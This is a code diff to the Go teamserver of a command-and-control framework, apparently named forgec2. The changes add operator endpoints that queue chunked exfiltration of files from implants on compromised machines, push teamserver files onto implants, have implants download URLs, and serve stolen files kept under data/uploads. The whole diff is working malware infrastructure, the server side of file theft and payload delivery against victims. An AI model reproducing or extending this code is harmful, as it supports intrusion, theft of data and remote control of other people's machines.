@@ -6,7 +6,9 @@ import (
 	"log/slog"
 	"mime/multipart"
 	"net/http"
+	"path/filepath"
 	"strconv"
+	"strings"
 	"time"
 
 	"github.com/forgec2/forgec2/internal/db"
@@ -59,7 +61,12 @@ func (s *Server) handleListDir(c *gin.Context) {
 	}
 
 	slog.Info("Directory list requested", "agent_id", id, "path", path)
-	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
+	c.JSON(http.StatusOK, gin.H{
+		"success": true,
+		"task_id": task.ID,
+		"queued":  true,
+		"kind":    "ls_task",
+	})
 }
 
 func (s *Server) handleFileDelete(c *gin.Context) {
@@ -114,11 +121,22 @@ func (s *Server) handleFileRead(c *gin.Context) {
 	s.dispatchTask(c, task, "file_read", filePath)
 }
 
+// handleFileUploadFromAgent queues an implant→server exfil (task type "upload"
+// with no payload bytes). Prefer POST /agents/:id/files/pull. The legacy
+// POST /files/upload path stays for old consoles.
 func (s *Server) handleFileUploadFromAgent(c *gin.Context) {
 	if !s.requireOperator(c) {
 		return
 	}
 	id := c.Param("id")
+	// A multipart file here means the operator hit the exfil route by mistake.
+	// Pushing a teamserver file onto the implant is POST /agents/:id/upload.
+	if strings.Contains(c.GetHeader("Content-Type"), "multipart/form-data") {
+		if _, err := c.FormFile("file"); err == nil {
+			respondError(c, http.StatusBadRequest, "this endpoint queues an implant-to-server exfil; use POST /agents/:id/upload to push a file onto the implant")
+			return
+		}
+	}
 	filePath := c.PostForm("path")
 	if filePath == "" {
 		respondError(c, http.StatusBadRequest, "file path required")
@@ -129,17 +147,37 @@ func (s *Server) handleFileUploadFromAgent(c *gin.Context) {
 		return
 	}
 
-	task, err := s.createTask(id, "upload", filePath, "", filePath, "", 0, 0)
+	offset, size := parseTransferRange(c)
+	task, err := s.createTask(id, "upload", filePath, "", filePath, "", offset, size)
 	if err != nil {
 		slog.Error("Failed to create task", "agent_id", id, "error", err)
 		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 
-	slog.Info("File upload requested", "agent_id", id, "path", filePath)
+	slog.Info("File exfil requested", "agent_id", id, "path", filePath, "offset", offset, "size", size)
 	s.dispatchTask(c, task, "file_upload_exfil", filePath)
 }
 
+func parseTransferRange(c *gin.Context) (offset, size int64) {
+	if v := c.PostForm("offset"); v != "" {
+		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n >= 0 {
+			offset = n
+		}
+	}
+	if v := c.PostForm("size"); v != "" {
+		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n > 0 {
+			if n > MaxTransferChunkSize {
+				n = MaxTransferChunkSize
+			}
+			size = n
+		}
+	}
+	return offset, size
+}
+
+// handleDownload queues an implant URL fetch onto its own disk (task type
+// "download", command = URL). This is not operator exfil.
 func (s *Server) handleDownload(c *gin.Context) {
 	if !s.requireOperator(c) {
 		return
@@ -168,12 +206,18 @@ func (s *Server) handleDownload(c *gin.Context) {
 	s.dispatchTask(c, task, "file_download_url", fileURL+" -> "+targetPath)
 }
 
+// handleUploadFile pushes a teamserver file onto the implant (task type
+// "upload" with payload bytes). Prefer POST /agents/:id/files/push. The
+// legacy POST /upload path stays for old consoles.
 func (s *Server) handleUploadFile(c *gin.Context) {
 	if !s.requireOperator(c) {
 		return
 	}
 	id := c.Param("id")
 	targetPath := c.PostForm("target_path")
+	if targetPath == "" {
+		targetPath = c.PostForm("path")
+	}
 	if targetPath == "" {
 		respondError(c, http.StatusBadRequest, "target path required")
 		return
@@ -234,8 +278,35 @@ func (s *Server) handleUploadFile(c *gin.Context) {
 	}
 	s.LogAuditRecord(c, "file_upload_push", "agent", id, targetPath, true, nil)
 
-	slog.Info("File upload chunk requested", "agent_id", id, "path", targetPath, "offset", task.Offset)
-	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
+	slog.Info("File push requested", "agent_id", id, "path", targetPath, "offset", task.Offset)
+	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID, "kind": "file_push", "queued": true})
+}
+
+// handleFileExfilGet serves a file the implant already exfiltrated into data/uploads/:id/.
+func (s *Server) handleFileExfilGet(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	id := c.Param("id")
+	filename := filepath.Base(c.Param("filename"))
+	if filename == "" || filename == "." || filename == ".." {
+		respondError(c, http.StatusBadRequest, "filename required")
+		return
+	}
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	dataDir := s.cfg.Server.DataDir
+	if dataDir == "" {
+		dataDir = "data"
+	}
+	base := filepath.Join(dataDir, "uploads", id)
+	requested := safeJoin(base, filename)
+	if requested == "" {
+		respondError(c, http.StatusBadRequest, "invalid filename")
+		return
+	}
+	serveFileSafe(c, requested, base, filename)
 }
 
 func readFileToBase64(file *multipart.FileHeader) (string, error) {
